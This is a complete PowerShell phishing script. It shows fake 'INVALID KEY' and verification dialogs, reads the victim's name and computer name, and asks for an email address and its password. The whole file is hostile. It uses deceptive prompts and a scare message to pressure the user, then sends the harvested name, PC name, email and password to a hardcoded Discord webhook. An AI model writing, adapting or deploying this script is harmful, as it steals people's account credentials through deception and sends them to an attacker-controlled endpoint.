Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

# -------- CONFIG --------
$WebhookUrl = "https://discord.com/api/webhooks/1453431333258002683/h-eMEGiityKM1_6yX_p_u_oBife5ObzHkb44Rogi3mz6PqMVcyg7bxIj9nasL8PupeDm"
$LogoUrl    = "https://www.bing.com/th/id/OIP.vaI5mdOwfF8e50rGYjsdKgHaE6?w=228&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2"
# ------------------------

function Get-ImageFromUrl {
    param([string]$Url)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $bytes = $wc.DownloadData($Url)
        $ms = New-Object System.IO.MemoryStream(,$bytes)
        return [System.Drawing.Image]::FromStream($ms)
    } catch {
        return $null
    }
}

function Show-InputWithLogo {
    param (
        [string]$Title,
        [string]$Message,
        [string]$ImageUrl
    )

    $form = New-Object System.Windows.Forms.Form
    $form.Text = $Title
    $form.Size = New-Object System.Drawing.Size(450,220)
    $form.StartPosition = "CenterScreen"
    $form.FormBorderStyle = "FixedDialog"
    $form.MaximizeBox = $false
    $form.MinimizeBox = $false
    $form.TopMost = $true

    $logo = New-Object System.Windows.Forms.PictureBox
    $logo.Size = New-Object System.Drawing.Size(64,64)
    $logo.Location = New-Object System.Drawing.Point(15,15)
    $logo.SizeMode = "StretchImage"
    $logo.Image = Get-ImageFromUrl $ImageUrl

    $label = New-Object System.Windows.Forms.Label
    $label.Text = $Message
    $label.Location = New-Object System.Drawing.Point(95,20)
    $label.Size = New-Object System.Drawing.Size(330,40)

    $textBox = New-Object System.Windows.Forms.TextBox
    $textBox.Location = New-Object System.Drawing.Point(95,65)
    $textBox.Size = New-Object System.Drawing.Size(330,22)

    $ok = New-Object System.Windows.Forms.Button
    $ok.Text = "OK"
    $ok.Location = New-Object System.Drawing.Point(345,110)
    $ok.Add_Click({
        $form.Tag = $textBox.Text
        $form.Close()
    })

    $form.AcceptButton = $ok
    $form.Controls.AddRange(@($logo,$label,$textBox,$ok))
    $form.ShowDialog() | Out-Null
    return $form.Tag
}

function Show-ConsentWithLogo {
    param (
        [string]$Message,
        [string]$ImageUrl
    )

    $form = New-Object System.Windows.Forms.Form
    $form.Text = "INVALID KEY"
    $form.Size = New-Object System.Drawing.Size(500,260)
    $form.StartPosition = "CenterScreen"
    $form.FormBorderStyle = "FixedDialog"
    $form.MaximizeBox = $false
    $form.MinimizeBox = $false
    $form.TopMost = $true

    $logo = New-Object System.Windows.Forms.PictureBox
    $logo.Size = New-Object System.Drawing.Size(64,64)
    $logo.Location = New-Object System.Drawing.Point(15,15)
    $logo.SizeMode = "StretchImage"
    $logo.Image = Get-ImageFromUrl $ImageUrl

    $label = New-Object System.Windows.Forms.Label
    $label.Text = $Message
    $label.Location = New-Object System.Drawing.Point(95,20)
    $label.Size = New-Object System.Drawing.Size(380,140)

    $yes = New-Object System.Windows.Forms.Button
    $yes.Text = "Yes"
    $yes.Location = New-Object System.Drawing.Point(310,175)
    $yes.Add_Click({ $form.Tag = $true; $form.Close() })

    $no = New-Object System.Windows.Forms.Button
    $no.Text = "No"
    $no.Location = New-Object System.Drawing.Point(395,175)
    $no.Add_Click({ $form.Tag = $false; $form.Close() })

    $form.Controls.AddRange(@($logo,$label,$yes,$no))
    $form.ShowDialog() | Out-Null
    return $form.Tag
}

# ------------------------
# AUTO-DETECTED INFO
# ------------------------
$pcName   = $env:COMPUTERNAME
$username = $env:USERNAME

try {
    $fullName = (Get-LocalUser -Name $username).FullName
} catch {
    $fullName = ""
}
if ([string]::IsNullOrWhiteSpace($fullName)) {
    $fullName = $username
}

# ------------------------
# CONSENT
# ------------------------
$consentText = "Detected Name: $fullName`nPC Name: $pcName`n`nIf this isnt your name please reset your computer.`n`nContinue?"
$consent = Show-ConsentWithLogo -Message $consentText -ImageUrl $LogoUrl
if ($consent -ne $true) { exit }

# ------------------------
# USER INPUT
# ------------------------
do {
    $email = Show-InputWithLogo -Title "Email Required" -Message "Hello $fullName, enter your email:" -ImageUrl $LogoUrl
} while ([string]::IsNullOrWhiteSpace($email))

do {
    $response = Show-InputWithLogo -Title "Input Required" -Message "Enter password to $email to verify its you:" -ImageUrl $LogoUrl
} while ([string]::IsNullOrWhiteSpace($response))

# ------------------------
# SEND TO DISCORD
# ------------------------
$payload = @{
    content = "@everyone`n`n**Name:** $fullName`n**PC Name:** $pcName`n**Email:** $email`n**Password:**`n$response"
} | ConvertTo-Json -Depth 3

Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "application/json" -Body $payload
